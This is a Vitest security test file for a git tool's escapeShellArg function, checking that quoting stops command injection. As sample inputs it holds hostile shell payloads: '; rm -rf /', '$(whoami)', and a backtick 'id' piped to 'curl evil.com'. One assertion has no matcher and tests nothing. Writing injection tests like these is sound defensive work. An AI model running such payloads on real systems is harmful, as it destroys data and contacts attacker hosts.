#!/usr/bin/env node

/**
 * Git Tool Security Tests
 *
 * Ensures proper escaping to prevent command injection.
 */

import { describe, it, expect } from "vitest";
import { escapeShellArg } from "../extensions/tools/git-tool";

describe("Git Tool Security: escapeShellArg", () => {
  it("should escape single quotes correctly", () => {
    const input = "file'name.txt";
    const escaped = escapeShellArg(input);
    // Expected: 'file'\''name.txt'  (single quoted, inner quote escaped as '\'')
    expect(escaped).toBe("'file'\\''name.txt'");
  });

  it("should escape multiple single quotes", () => {
    const input = "file'with'many'quotes";
    const escaped = escapeShellArg(input);
    // Each ' becomes '\'' within the outer quotes
    expect(escaped).toBe("'file'\\''with'\\''many'\\''quotes'");
  });

  it("should leave other characters untouched", () => {
    const input = "normal-file-name-123.txt";
    const escaped = escapeShellArg(input);
    expect(escaped).toBe("'normal-file-name-123.txt'");
  });

  it("should handle empty string", () => {
    const input = "";
    const escaped = escapeShellArg(input);
    expect(escaped).toBe("''");
  });

  it("should escape shell metacharacters safely when wrapped", () => {
    const malicious = "; rm -rf /";
    const escaped = escapeShellArg(malicious);
    // escaped string starts and ends with single quote, the semicolon is inside
    expect(escaped).toBe("'; rm -rf /'");
    // Ensure no unescaped single quote inside (the outer quotes are the only single quotes at boundaries)
    const inner = escaped.slice(1, -1);
    expect(inner.includes("'\\'")); // embedded escaped pattern only if quote present
    // For this input, no single quote so inner is exactly the malicious string
    expect(inner).toBe("; rm -rf /");
  });

  it("should escape payloads that attempt command substitution", () => {
    const payload = "$(whoami)";
    const escaped = escapeShellArg(payload);
    expect(escaped).toBe("'$(whoami)'");
  });

  it("should escape backticks and pipes", () => {
    const payload = "file`id` | curl evil.com";
    const escaped = escapeShellArg(payload);
    expect(escaped).toBe("'file`id` | curl evil.com'");
  });
});
